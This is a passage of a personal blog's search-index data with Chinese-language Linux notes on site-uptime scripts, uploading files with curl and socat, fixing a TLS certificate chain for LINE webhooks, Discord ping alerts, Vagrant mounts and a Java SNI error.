辛比誌](https://xenby.com/b/205-%E6%8E%A8%E8%96%A6-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9F%E6%9C%AC%E5%9C%B0%E7%AB%AF%E9%96%8B%E7%99%BC%E7%94%A8ssl%E6%86%91%E8%AD%89%E5%B7%A5%E5%85%B7-mkcert)\n\n* [2020 大改造宅宅雲架構系列文-5 窮人版 PKI - Phil Workspace](https://blog.pichuang.com.tw/20200204-homelcloud-high-level-design-5/) {% asset_link web2.png 備份圖 %}\n裡面有提到 CRL\n\n* [使用 Openssl 建立憑證 | Raix's Blog](https://raix852.github.io/2016/06/20/use-openssl-generate-certificate/) {% asset_link web3.png 備份圖 %}\n這邊也有提到 CRL\n\n* [rfc 5280 X.509 PKI 解析 - charlieroro - 博客园](https://www.cnblogs.com/charlieroro/p/10948173.html)","tags":["cert"],"categories":["Linux"]},{"title":"監控多個網頁腳本(Shell)","url":"%2Fblog%2F2020%2F07%2F15%2F%E7%9B%A3%E6%8E%A7%E5%A4%9A%E5%80%8B%E7%B6%B2%E9%A0%81%E8%85%B3%E6%9C%AC-Shell%2F","content":"\n最近專案 Server 特別多...\n所以在想有什麼腳本可以快速確認服務正常\n又爬文整理一下\n主要是參考這篇 [6 Methods to Quickly Check if a Website is up or down from the Linux Terminal | 2daygeek.com](https://www.2daygeek.com/linux-command-check-website-is-up-down-alive/)\n\n<!--more-->\n\n主要參考\n```bash\n# vi curl-url-check-1.sh\n\n#!/bin/bash\nfor site in www.google.com google.co.in www.xyzzz.com\ndo\nif curl -I \"$site\" 2>&1 | grep -w \"200\\|301\" ; then\n    echo \"$site is up\"\nelse\n    echo \"$site is down\"\nfi\necho \"----------------------------------\"\ndone\n```\n\n最後只需要`# sh curl-url-check-1.sh`\n就能測試了\n\n## 我簡單修改\n\n```bash\n#!/bin/bash\n\nurl_list=(\n# web\nhttps://***.jsp\nhttps://***.jsp\nhttps://***.jsp\nhttps://***.jsp\nhttps://***.jsp\nhttp://1***.jsp\nhttp://1***.jsp\n# api\nhttps://***.jsp\nhttps://***.jsp\nhttps://***.jsp\nhttps://***.jsp\nhttps://***.jsp\nhttp://1***.jsp\nhttp://1***.jsp\n)\n\nfor site in \"${url_list[@]}\"\ndo\nif curl -k -i \"$site\" 2>&1 | grep -w \"200\\|301\" ; then\n    echo \"$site is up\"\nelse\n    echo \"$site is down\"\nfi\necho \"----------------------------------\"\ndone\n```\n\n## 加入顏色\n\n太多了，眼睛看的不是很舒服\n\n```bash\n#!/bin/bash\n\nCOLOR_REST='\\e[0m';\nCOLOR_GREEN='\\e[0;32m';\nCOLOR_RED='\\e[0;31m';\n\nurl_list=(\n# WEB\nhttps://***.jsp\nhttps://***.jsp\nhttps://***.jsp\nhttps://***.jsp\nhttp://1***.jsp\nhttp://1***.jsp\n# API\nhttps://***.jsp\nhttps://***.jsp\nhttps://***.jsp\nhttps://***.jsp\nhttp://1***.jsp\nhttp://1***.jsp\n)\n\nfor site in \"${url_list[@]}\"\ndo\nif curl -k -i \"$site\" 2>&1 | grep -w \"200\\|301\" ; then\n    echo -e \"$site is ${COLOR_GREEN}up${COLOR_REST}\"\nelse\n    echo -e \"$site is ${COLOR_RED}down${COLOR_REST}\"\nfi\necho \"----------------------------------\"\ndone\n```\n\n\n完成，愉悅 XD\n\n[6 Methods to Quickly Check if a Website is up or down from the Linux Terminal | 2daygeek.com](https://www.2daygeek.com/linux-command-check-website-is-up-down-alive/)\n裡面還有fping \n但好像無法對單一網址\n所以就沒繼續研究","tags":["web"],"categories":["Linux"]},{"title":"使用 command line 上傳檔案到 HFS","url":"%2Fblog%2F2020%2F07%2F15%2F%E4%BD%BF%E7%94%A8-command-line-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88%E5%88%B0-HFS%2F","content":"\n最近要使用 Linux 下載憑證下來看\n主機沒有裝 vsftpd 想說用 WinSCP 下載\n但又發現沒有使用 root 權限無法進去資料夾\n有想到有沒有 sudo 方法\n[Winscp使用sudo user登录-阿里云开发者社区](https://developer.aliyun.com/article/373923)\n但不太想改這個設定...\n最後突然想到有 Windows HFS 來接檔案\n原本有想到 nc 接檔案，但好像很麻煩 哈哈\n[Ubuntu 用 nc 指令互傳檔案](https://www.arthurtoday.com/2012/01/ubuntu.html)\nWindows 也沒 nc 指令\n\n<!--more-->\n\n\n非常簡單\n\n```bash\ncurl -F fileupload1=@filename -F press=\"Upload files\" http://IP:Port/Dir/\n```\n\n記得資料夾要設定上傳 anyone\n原理可以看[curl upload file @ 495884965 :: 痞客邦 ::](https://slinbody.pixnet.net/blog/post/66022614)\n\n\n> #curl -v -F 'file=@/tmp/444.jpg' -b cookies.txt -c cookies.txt  https://your.web.site/upload\n> 其中，file要看該網頁的變數名稱決定\n>  \n> \n> 例如： \n> ```html\n>     <form method=post enctype=multipart/form-data>\n>       <p><input type=file name=file_name>\n>          <input type=submit value=Upload>\n>     </form>\n> ```\n> 用curl時，就要變成file_name\n\n我還以為 @ 是多餘的\n\n最後成功\n\n最後有爬到[upload with filename inside URL](http://rejetto.com/forum/index.php?pretty;board=hfs-~-http-file-server;topic=upload-with-filename-inside-url.msg1042258#msg1042258)\n\n> 1) The curl command shown below without an ending \"/\" after the `<HFSfolder>` works better in that it return the \"301\" code to the console when everything works properly (with an ending \"/\" you get the echo of the HFS html upload page, the upload still works fine, but having the return code available to any error checking in a script is probably be better).  You probably know better than I why there is this slight difference between having the \"/\" at the end and not having it.\n```bash\ncurl  -F fileupload1=@MyFile.iso  -F press=\"Upload files\"  http://<HFSipaddress>/<HFSfolder>\n```\n> 2) I've tested curl ability to take input from stdin via a command, for example, like this:\n```bash\ncat testfile.gz  |  curl -F fileupload1=@-;filename=atestfile.gz -F press=\"Upload files\" http://<HFSipaddress>/<HFSfolder>\n```\n\n\n## socat 大法\n\non host 1 \t\n```\nsocat -u open:myfile.exe,binary tcp-listen:999\n```\non host 2 \t\n```\nsocat -u tcp:host1:999 open:myfile.exe,create,binary\n```\n\n參考:[socat 使用手册 « 倾旋的博客](https://payloads.online/tools/socat)","tags":["curl"],"categories":["Linux"]},{"title":"設備根憑證不正確導致不能打API問題","url":"%2Fblog%2F2020%2F07%2F14%2F%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C%2F","content":"\n最近要上線的專案會用到 LINE WEBHOOK\n竟然上正式環境 line 後台 webhook 模擬可以觸發 API\n但使用行動裝置竟然不可以打...(access.log沒有收到訊息)\n我們公司有防火牆、Server Load Balancer...\n查詢上花了不少時間\n\n<!--more-->\n\n由於流程很多，我上面就直接講重點\n\n## 檢查方向\n\n### LINE 文章有提到注意事項\n\n> 在設定HTTPS伺服器時，有下列幾點必須注意的事項：\n>\n>    1. HTTPS伺服器所使用的根憑證（Root CA）必須是在LINE平台的白名單列表中，否則LINE平台會拒絕傳送訊息。在白名單列表中大多數的憑證都需要付費申請，但是LINE平台也支援常用的免費憑證，例如Let’s Encrypt。\n>    2. 請勿使用已知具有安全性漏洞的協定（例如SSL v2或SSL v3）或Cipher Suite（例如SWEET32或CVE-2016-2183）。\n>    3. 請務必正確設定中繼憑證（Intermediate certificate），以避免無法對應到根憑證而發生錯誤。這是最常見的問題通報狀況，請在設定HTTPS伺服器時多加留意。\n\n[開發LINE聊天機器人不可不知的十件事 - LINE ENGINEERING](https://engineering.linecorp.com/zh-hant/blog/line-device-10/)\n\n我們公司瀏覽器看網頁沒有跳出安全性問題，Android、Iphone、Linux 也沒有問題\n所以第一項認為沒問題，但魔鬼出在細節裡\n文章裡的根憑證白名單列表看不見\n**Google 一下會發現 TWCA 沒有這個憑證，後面再詳細說明**\n[developers.line.biz/media/messaging-api/build-bot/ca_root_v2.txt](https://developers.line.biz/media/messaging-api/build-bot/ca_root_v2.txt)\n總之我們前面認為這一段沒有問題\n\n2,3 憑證都確認都沒有問題\n\n[SSL Certificate Comparison and Reviews](https://www.sslshopper.com/)\n\n這個網站就可以檢查憑證是否有問題\n\n### Load Balance SNI 設定\n\n當我們憑證出問題的時候\n網路同仁有打電話給 Load Balance 廠商詢問設定\n廠商提到要設定 SNI\n讓我想到之前驗證環境的問題\n[Java 因憑證 SNI 問題驗證不過 | 程式狂想筆記](https://malagege.github.io/blog/2020/06/25/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/)\n原來 Apache 做的設定，對應 LB(負載平衡)機器也要做這些設定\n但遺憾還是沒有解決問題\n\n### 根憑證是否為裝置(Client)認證\n\n前面第一點已經據透了\n我們發現驗證環境的萬用憑證可以跑\n但是正式環境驗證憑證不可以跑\n\n原來公司舊有憑證是四層(TWCA)\n但是新憑證是三層(TWCA)\n這2種都是合法憑證\n\n{% asset_img l4.png 四層 %}\n\n{% asset_img l3.png 三層 %}\n\n從憑證路徑可以看到一個三層，一個四層\n但偏偏 LINE ROOT CA 只有`CN=TWCA Root Certification Authority, OU=Root CA, O=TAIWAN-CA, C=TW`\n沒有 TWCA ROOT CA\n\n公司剛好因為換新憑證都改用三層\n所以會有這個問題...\n\n所以中繼憑證改成四層就沒這個問題\n\n1. 完美成果\n\n{% asset_img cgh.png \"\" %}\n\n{% asset_img cgh2.png \"2\" %}\n\n2. root ca 包在中繼憑證，順序錯誤\n\n{% asset_img eci.png \"\" %}\n\n{% asset_img eci2.png \"\" %}\n\n3. root ca 包在中繼憑證+中繼憑證順序錯誤\n\n{% asset_img linewebhook.png \"\" %}\n\n{% asset_img linewebhook2.png \"\" %}\n\n我的建議憑證包四層比較不會出問題\n因為第二層憑證是一樣的\n第三層的話，Root CA 就會抓到白名單\n\n假如四層的話，中繼串到第三個後面，就是白名單\n不過 TWCA 說最新發的都是三層??~~這原因我就沒深入追查~~\n[產生自簽憑證筆記 | TWCA 憑證為什麼有三層，四層串到同一個憑證呢?](https://malagege.github.io/blog/2020/07/18/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/#TWCA-%E6%86%91%E8%AD%89%E7%82%BA%E4%BB%80%E9%BA%BC%E6%9C%89%E4%B8%89%E5%B1%A4%EF%BC%8C%E5%9B%9B%E5%B1%A4%E4%B8%B2%E5%88%B0%E5%90%8C%E4%B8%80%E5%80%8B%E6%86%91%E8%AD%89%E5%91%A2)\n我猜應該相同名字會抓出來比較\n剛好兩張私鑰都是一樣的\n\n題外話，這邊我發現有趣現象\n用 Firefox 是三層(沒有看到四層)，Chrome(IE,Window)是四層\n不知道是不是憑證是用 名稱去找的 ~~**這個是我猜的，目前沒有找到資訊**~~\n> 憑證簽發者(ISSUER)的名稱與憑證主體(Subject Name)名稱相同!\n參考:[憑證串鍊的解釋 - SSL憑證推薦網 | SSL憑證 | code Sign](https://www.sslbuyer.com/index.php?option=com_content&view=article&id=183:what-is-certificate-chain&catid=25&Itemid=4031)\n難道真的是看名字??\nAndroid也是三層\n剛好有抓到 TWCA Root CA 根憑證所以才三層\n至於怎麼抓的就不研究了\n\n現在回想[萬用憑證(WildCard)和中間憑證小記 | 程式狂想筆記](https://malagege.github.io/blog/2018/10/10/%E8%90%AC%E7%94%A8%E6%86%91%E8%AD%89-WildCard-%E5%92%8C%E4%B8%AD%E9%96%93%E6%86%91%E8%AD%89%E5%B0%8F%E8%A8%98/)\n是不是沒有串到根憑證??現在也查不到了\n\n### 檢查 Chipser\n\n* [那些關於SSL/TLS的二三事(九) — SSL (HTTPS)Communication | by Carl | Medium](https://medium.com/@clu1022/%E9%82%A3%E4%BA%9B%E9%97%9C%E6%96%BCssl-tls%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B-%E4%B9%9D-ssl-communication-31a2a8a888a6)\n\n* [Apache進階設定(1) - TLSv1.2 TLSv1.1 SSLv2 SSLv3 - BrilliantCode.net](https://www.brilliantcode.net/1229/apache-advance-settings-tlsv1-2-tlsv1-1-sslv3/)\n\n之前有聽說可以不戴加密做 TLS\n有看到這個關鍵字 null cipher suites\n不知道是不是指這個?\n我就不詳細研究了\n\n## 名詞整理\n\n### 根憑證\n\n> Self-Signed CA\n> 亦可稱為 root CA。由於此種 CA 所發的憑證(certificate)是不經由任何上層 CA 所認證，而是以「自行認證」的方式進行認證。因此像是最上層的商業 CA，或是自行架設內部認證用的 CA，都可以屬於此類。\n參考來源: [Certificate Authority(CA) 憑證簡介 @ MISTECH 技術手抄本 :: 痞客邦 ::](https://mistech.pixnet.net/blog/post/80751019-certificate-authority%28ca%29-%E6%86%91%E8%AD%89%E7%B0%A1%E4%BB%8B)\n\n簡單來說就是根憑證，一開始你的電腦微軟附的作業系統裡面，有裝一些憑證，隨著系統更新，這些憑證都會update。\n根憑證因為沒有上層，所以你電腦有根憑證白名單，就會算是合法的憑證。\n\n### 中繼憑證\n\n\n{% asset_img chain.png title %}\n參考來源:[那些關於SSL/TLS的二三事(十二) — Chain of Trust | by Carl | Medium](https://medium.com/@clu1022/%E9%82%A3%E4%BA%9B%E9%97%9C%E6%96%BCssl-tls%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B-%E5%8D%81%E4%BA%8C-chain-of-trust-f00da1f2cc15)\n這篇說得很清楚，但我也只是略懂略懂\n一直在想為什麼會有中繼憑證，缺少中繼憑證會發生什麼事?順序錯會發生什麼事?\n當前憑證並非是 Root CA 認證而是靠中繼憑證...\n中繼憑證會再往上根 Root Ca 驗證\n到白名單就是安全性任憑正\n\n### 憑證加密過程\n\n![](https://upload.wikimedia.org/wikipedia/commons/thumb/6/65/PublicKeyCertificateDiagram_It.svg/langzh-1100px-PublicKeyCertificateDiagram_It.svg.png)\n\n簡單說就是 `公鑰` + `上層憑證私鑰` = 憑證\n這張憑證就會給你設定 Apache 上\n驗證憑證會跟上層憑證公鑰解開加密確認值\n一致就確認沒問題，繼續往上面憑證追查，直到 Root CA\n\n\n### 整理憑證鍊遇到問題\n\n#### Contains anchors\n\n包到主憑證，之前有看過文章中繼憑證不需要包 root ca\n\n[Chain issues: Contains anchors](https://qualys-secure.force.com/discussions/s/question/0D52L00004TnvJ5SAJ/chain-issues-contains-anchors)\n[Trouble with intermediate certificate \"Chain Issues: Incomplete\"](https://qualys-secure.force.com/discussions/s/question/0D52L00004TnyFQSAZ/trouble-with-intermediate-certificate-chain-issues-incomplete)\n\n#### Extra download\n\n好像就是中繼憑證跟給予憑證沒包在一起樣子?\n我沒有實驗，像 nginx 就沒有中繼憑證設定\n不是很確定原因\n\n[How to fix \"Extra download\"](https://qualys-secure.force.com/discussions/s/question/0D52L00004TnuTuSAJ/how-to-fix-extra-download)\n[Multiple Certification Paths](https://qualys-secure.force.com/discussions/s/question/0D52L00004TnuRQSAZ/multiple-certification-paths)\nhttps://www.ssl.com.tw/Down/\n\n\n\n### 下載憑證方法(無法看到中繼憑證)\n\n[Get SSL Certificate from Server (Site URL) - Export & Download - ShellHacks](https://www.shellhacks.com/get-ssl-certificate-from-server-site-url-export-download/)\n\n```bash\n# 下載憑證 (不包含中繼)\necho | openssl s_client -servername NAME -connect HOST:PORT |\\\n  sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > certificate.crt\n# 查看中繼憑證 (-A 數字可以大一點)\n echo \"\"|openssl s_client -connect www.cgh.org.tw:443 2>&1 | grep -A 9 \"Certificate chain\"\n```\n其實之前就有做過類似筆記:[Linux 指令確認SSL憑證 | 程式狂想筆記](https://malagege.github.io/blog/2020/05/30/Linux-%E6%8C%87%E4%BB%A4%E7%A2%BA%E8%AA%8DSSL%E6%86%91%E8%AD%89/)\n\n### 格式轉換\n\n[openssl 指令 command line - 轉檔 pem/der/p7b/pfx/cer | SSORC.tw](https://ssorc.tw/7142/openssl-%E6%8C%87%E4%BB%A4-command-line-%E8%BD%89%E6%AA%94-pem-der-p7b-pfx-cer/)\n\n\n\n\n\n### 其他\n\n安裝中繼憑證\n* [Yy's Program: GCA政府憑證串鍊(Certificate chain)問題](http://yy-programer.blogspot.com/2019/02/gcacertificate-chain.html)\n\n\nsee chain \n* [ssl - show entire certificate chain for a local certificate file - Stack Overflow](https://stackoverflow.com/questions/18733383/show-entire-certificate-chain-for-a-local-certificate-file)\n* [Show the certificate chain of a local X509 file - kdecherf ~ %](https://kdecherf.com/blog/2015/04/10/show-the-certificate-chain-of-a-local-x509-file/)\n這邊是做憑證驗證\n\n憑證教學\n* [SSL 憑證申請、取得及安裝 @ 來吧~~~電腦 :: 隨意窩 Xuite日誌](https://blog.xuite.net/towns/hc/556816027-SSL+%E6%86%91%E8%AD%89%E7%94%B3%E8%AB%8B%E3%80%81%E5%8F%96%E5%BE%97%E5%8F%8A%E5%AE%89%E8%A3%9D)\n\n* [Apache Nginx上安裝 TWCA憑證 - Alvin Chen Club](http://www.alvinchen.club/2018/09/27/apache-nginx%E4%B8%8A%E5%AE%89%E8%A3%9D-twca%E6%86%91%E8%AD%89/)\n\n* [Mozilla SSL Configuration Generator](https://ssl-config.mozilla.org/#server=apache&version=2.4.41&config=intermediate&openssl=1.1.1d&guideline=5.4)\n之後相關 Apache, Redis, Mysql  TLS 加密可以看這邊設定\n\n## 小記\n\n原本這個問題沒有頭緒，line webhook 後臺可以打得到AP\n但是用手機 LINE APP 操作就抓不到\n有用防火牆看到 Server Action RST\n正常Action:Session close\n後來用公司 Load Balancer 作風包解析(tcpdump)\n發現這一塊 https 三項交握有問題\n\n看了這篇除了驗證憑證，那註銷後的憑證要怎麼確認\nGoogle 一下找到 CRL([寫程式是良心事業: OCSP & CRL 介紹](http://ijecorp.blogspot.com/2016/01/ocsp-crl.html))\n這邊就不先繼續研究了\n\n我覺得之後可以手動做做看\n\n~~TODO: 之後可能照保哥做做看自簽名憑證~~\n[產生自簽憑證筆記 | 程式狂想筆記](https://malagege.github.io/blog/2020/07/18/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/)\n完成測試\n\n這篇算是我的筆記，也許會有很多寫錯，建議大家還是看看大神寫文章!!\n[購買與安裝 SSL 憑證完全攻略（以 IIS7 為例） | The Will Will Web](https://blog.miniasp.com/post/2010/03/02/The-Complete-Guide-for-Purchase-Install-SSL-Certificate-to-IIS7)\n[如何使用 OpenSSL 建立開發測試用途的自簽憑證 (Self-Signed Certificate) | The Will Will Web](https://blog.miniasp.com/post/2019/02/25/Creating-Self-signed-Certificate-using-OpenSSL?fbclid=IwAR3xS1xqkOfLQmK22bDyp9bgOJ71PBNChr-2REMq3oIMT5-0biUTJl41a1k)\n[免費申請 StartSSL™ 個人數位簽章與網站 SSL 憑證完全攻略 | The Will Will Web](https://blog.miniasp.com/post/2013/01/09/The-Complete-Guide-Free-StartSSL-personal-and-web-site-ssl-tls-certificates)\n","tags":["憑證"],"categories":["Linux"]},{"title":"監控電腦活著發送 DISCORD 通知","url":"%2Fblog%2F2020%2F06%2F27%2F%E7%9B%A3%E6%8E%A7%E9%9B%BB%E8%85%A6%E6%B4%BB%E8%91%97%E7%99%BC%E9%80%81-DISCORD-%E9%80%9A%E7%9F%A5%2F","content":"\n最近 Raspberry Pi 三號機網路常常掛點\n雖然之前有找到讓它重新開機的方法\n[Linux在Wifi使用pppoe連線後，重開機不能連線上網 | 程式狂想筆記](https://malagege.github.io/blog/2019/01/27/Linux%E5%9C%A8Wifi%E4%BD%BF%E7%94%A8pppoe%E9%80%A3%E7%B7%9A%E5%BE%8C%EF%BC%8C%E9%87%8D%E9%96%8B%E6%A9%9F%E4%B8%8D%E8%83%BD%E9%80%A3%E7%B7%9A%E4%B8%8A%E7%B6%B2/)\n但我沒採用這個方案\n畢竟有時候需要確保有哪些程式正在執行\n再重開機是比較好的\n\n<!--more-->\n\n## 有問題電腦解決重新連線方法\n\n最近看到[Headless raspberryPi with eth0+USB issue Register 0x00000114 - Raspberry Pi Forums](https://www.raspberrypi.org/forums/viewtopic.php?t=19971)\n這邊會 ping 自己的路由\n失敗會重啟 Interface\n\n```bash\n#!/bin/sh\n\n# cron script for checking wlan connectivity\nIP_FOR_TEST=\"192.168.1.1\"\nPING_COUNT=1\n\nPING=\"/bin/ping\"\nIFUP=\"/sbin/ifup\"\nIFDOWN=\"/sbin/ifdown --force\"\nINTERFACE=\"eth0\"\n\nFFLAG=\"/opt/check_lan/stuck.fflg\"\n\n# ping test\n$PING -c $PING_COUNT $IP_FOR_TEST > /dev/null 2> /dev/null\nif [ $? -ge 1 ]\nthen\n    logger \"$INTERFACE seems to be down, trying to bring it up...\"\n        if [ -e $FFLAG ]\n        then\n                logger \"$INTERFACE is still down, REBOOT to recover ...\"\n                rm -f $FFLAG 2>/dev/null\n                sudo reboot\n        else\n                touch $FFLAG\n                logger $(sudo $IFDOWN $INTERFACE)\n                sleep 10\n                logger $(sudo $IFUP $INTERFACE)\n        fi\nelse\n#    logger \"$INTERFACE is up\"\n    rm -f $FFLAG 2>/dev/null\nfi\n```\n但我不想重開機\n之後找時間改寫\n\n### 改成監控紀錄 log\n\n```bash\n#!/bin/sh\n\n# cron script for checking wlan connectivity\nIP_FOR_TEST=\"192.168.1.1\"\nPING_COUNT=1\n\nPING=\"/bin/ping\"\nINTERFACE=\"eth0\"\n\n# ping test\n$PING -c $PING_COUNT $IP_FOR_TEST > /dev/null 2> /dev/null\nif [ $? -ge 1 ]\nthen\n    logger -it check_interface \"=============================\"\n    logger -it check_interface \"$INTERFACE seems to be down, trying to bring it up...\"\n    logger -it check_interface \"carrier:\"\n    cat /sys/class/net/eth0/carrier | logger -it check_interface\n    logger -it check_interface \"operstate:\"\n    cat /sys/class/net/eth0/operstate | logger -it check_interface\n    logger -it check_interface \"route -n\"\n    route -n 2>&1 | logger -it check_interface\n    logger -it check_interface \"ifconfig:\"\n    ifconfig 2>&1 | logger -it check_interface\n    logger -it check_interface \"ping:\"\n    ping -c4 192.168.1.1 | logger -it check_interface\n    ping -c4 8.8.8.8 | logger -it check_interface\n    logger -it check_interface \"=============================\"\nfi\n```\n\n紀錄 log\n[linux日志logger命令详解_飘过的春风-CSDN博客_linux logger](https://blog.csdn.net/u011630575/article/details/52055116)\n[Linux 如何將資料寫到 Syslog | Tsung's Blog](https://blog.longwin.com.tw/2011/11/linux-data-syslog-logger-2011/)\n[shell - Linux : how to redirect stdout & stderr to logger? - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/124455/linux-how-to-redirect-stdout-stderr-to-logger)\n\n相關 interface 資訊\n[如何在 Linux Kernel 下偵測網路的連線狀態？](http://rainstingtw.blogspot.com/2014/08/how-to-detect-ethernet-connected-state.html)\n[wifi连接中operstate和carrier分别是什么作用？-CSDN论坛](https://bbs.csdn.net/topics/390495032)\n[在Linux上，如何檢測物理電纜是否已連接到網卡插槽 - Ubuntu問答](https://ubuntuqa.com/zh-tw/article/7995.html)\n[树莓派折腾日记 二：网络相关配置 | 冰棒实验室](https://blog.beanbang.cn/2019/05/17/raspberry-diary-02-network-configure/)\n\n## 監控電腦活著發送 DISCORD 通知\n\n其他機都非常穩定\n別台監控狀態\n\n```bash\n#!/bin/bash\nPING=\"/bin/ping\"\nPING_COUNT=1\n\nIP=(\n192.168.1.1\n192.168.1.2\n192.168.1.3\n)\nDSCORD_WEBHOOK=\"https://discordapp.com/api/webhooks/*\"\n\nfunction sendDiscordNotice(){\n        local MSG=$2\n        # echo $MSG\n        local URL=$1\n        curl -H \"Content-Type: application/json\" \\\n        -X POST \\\n        -d \"{\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"${MSG}\\\"}\" $URL\n}\n\n#sendDiscordNotice $DSCORD_WEBHOOK \"test\"\nfor i in \"${IP[@]}\"\ndo\n    #echo $i\n    MSG=\"${i} 沒法 PING 到主機，請管理員查詢狀況\"\n    #echo $MSG\n    $PING -c $PING_COUNT $i > /dev/null 2> /dev/null\n    if [ $? -ge 1 ]; then\n        sendDiscordNotice \"${DSCORD_WEBHOOK}\" \"${MSG}\"\n    fi\ndone \n\n```\n\n\n這邊學到shell function 參數是用 $1 $2\n參數最後外面加個`\"`預防參考帶進去有問題\n\n[Bash 程式設計教學與範例：function 自訂函數 - Office 指南](https://officeguide.cc/bash-tutorial-define-use-functions/)\n\n對 variable 使用 foeach\n\n[Loop through an array of strings in Bash? - Stack Overflow](https://stackoverflow.com/questions/8880603/loop-through-an-array-of-strings-in-bash)\n\n## 番外\n\n### 開機做發信動作\n\n[ubuntu server 開機自動發信通知(使用gmail) | pupuliao的部落格](https://www.pupuliao.info/2013/06/ubuntu-server-%E9%96%8B%E6%A9%9F%E8%87%AA%E5%8B%95%E7%99%BC%E4%BF%A1%E9%80%9A%E7%9F%A5%E4%BD%BF%E7%94%A8gmail/)\n\n決得這邊沒有考慮到網路的問題\n但這個方法也滿有用的\n先記錄\n\n### ","tags":["discord"],"categories":["Linux"]},{"title":"vagrant 啟動無法自動掛載解決方法","url":"%2Fblog%2F2020%2F06%2F26%2Fvagrant-%E5%95%9F%E5%8B%95%E7%84%A1%E6%B3%95%E8%87%AA%E5%8B%95%E6%8E%9B%E8%BC%89%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95%2F","content":"\n最近發現 Ubuntu 某一版就不能做自動掛載\n會出現\n```\nVagrant was unable to mount VirtualBox shared folders. This is usually\nbecause the filesystem \"vboxsf\" is not available. This filesystem is\nmade available via the VirtualBox Guest Additions and kernel module.\nPlease verify that these guest additions are properly installed in the\nguest. This is not a bug in Vagrant and is usually caused by a faulty\nVagrant box. For context, the command attempted was:\n\nmount -t vboxsf -o uid=1000,gid=1000 vagrant /vagrant\n\nThe error output from the command was:\n\n/sbin/mount.vboxsf: mounting failed with the error: No such device\n```\n\n<!--more-->\n\n其實只要安裝\nvagrant plugin install vagrant-vbguest\n\n就解決了","tags":["virtualbox"],"categories":["Vagrant"]},{"title":"Java 因憑證 SNI 問題驗證不過","url":"%2Fblog%2F2020%2F06%2F25%2FJava-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E%2F","content":"\n最近在做 line webhook\n但是做測試的時候\n發現沒有呼叫我的程式\n但我手機、其他電腦都可以連線\n這又非常詭異\n\n<!--more-->\n\n## 使用外部網站檢查\n\n我在[SSL Server Test (Powered by Qualys SSL Labs)](https://www.ssllabs.com/ssltest/)做測試\n是在這裡面找到的[edelahozuah/awesome-tls-security: A collection of (not-so, yet) awesome resources related to TLS, PKI and related stuff](https://github.com/edelahozuah/awesome-tls-security)\n\n這個網站可以找到很多問題\n但主要不能連我是遇到的問題是`Client aborts on SNI unrecognized_name warning`\n\n{% asset_img error1.png \"Java SNI 憑證問題\" %}\n\n\n\n## 使用 Java SSLTEST\n\n不多說，紀錄安裝過程\n\n```bash\n# 安裝 jdk\nsudo apt install default-jdk #openjdk-11-jdk\n\n# 下載 ssltest\ngit clone https://github.com/ChristopherSchultz/ssltest.git\n\ncd ssltest\n./build.sh # 記得 socure 跟 target 要改11 因為我使用的是11\ncd build\njava -jar ssltest.jar google.com\n# 我第一次的實用適用 jdk 7 跑，會有 sni Exception\n# 但我現在用 jdk 11 沒有跑出 Exception\n# 不過可以看到沒有 Accepted\njava -jar ssltest.jar  google.com.tw | grep Accepted\n\n\n```\n\n自己來寫一隻來驗證\n其實用 postman 產生範例\n搭配我之前 maven 執行\n```java\nOkHttpClient client = new OkHttpClient();\n\nRequest request = new Request.Builder()\n  .url(\"http://httpbin.org/get?test=123%20123\")\n  .get()\n  .addHeader(\"cache-control\", \"no-cache\")\n  .addHeader(\"postman-token\", \"b0cbc43f-9a70-1056-951e-e5b0c6b2dd33\")\n  .build();\n\nResponse response = client.newCall(request).execute();\n```\n\nmaven 不知道為什麼執行要加這段` -Dexec.cleanupDaemonThreads=false`\n[运行 mvn java:exec 如何避免 `IllegalThreadStateException` - 尚码园](https://www.shangmayuan.com/a/405034f1ec9c45fe8e1aa411.html)\n\n```\n[WARNING] \njavax.net.ssl.SSLHandshakeException: received handshake warning: unrecognized_name\n    at sun.security.ssl.Alert.createSSLException (Alert.java:131)\n    at sun.security.ssl.Alert.createSSLException (Alert.java:117)\n    at sun.security.ssl.TransportContext.fatal (TransportContext.java:313)\n    at sun.security.ssl.TransportContext.fatal (TransportContext.java:269)\n    at sun.security.ssl.TransportContext.fatal (TransportContext.java:260)\n    at sun.security.ssl.Alert$AlertConsumer.consume (Alert.java:272)\n    at sun.security.ssl.TransportContext.dispatch (TransportContext.java:186)\n    at sun.security.ssl.SSLTransport.decode (SSLTransport.java:164)\n    at sun.security.ssl.SSLSocketImpl.decode (SSLSocketImpl.java:1144)\n    at sun.security.ssl.SSLSocketImpl.readHandshakeRecord (SSLSocketImpl.java:1055)\n    at sun.security.ssl.SSLSocketImpl.startHandshake (SSLSocketImpl.java:395)\n    at okhttp3.internal.connection.RealConnection.connectTls (RealConnection.kt:367)\n    at okhttp3.internal.connection.RealConnection.establishProtocol (RealConnection.kt:325)\n    at okhttp3.internal.connection.RealConnection.connect (RealConnection.kt:197)\n    at okhttp3.internal.connection.ExchangeFinder.findConnection (ExchangeFinder.kt:249)\n    at okhttp3.internal.connection.ExchangeFinder.findHealthyConnection (ExchangeFinder.kt:108)\n    at okhttp3.internal.connection.ExchangeFinder.find (ExchangeFinder.kt:76)\n    at okhttp3.internal.connection.RealCall.initExchange$okhttp (RealCall.kt:245)\n    at okhttp3.internal.connection.ConnectInterceptor.intercept (ConnectInterceptor.kt:32)\n    at okhttp3.internal.http.RealInterceptorChain.proceed 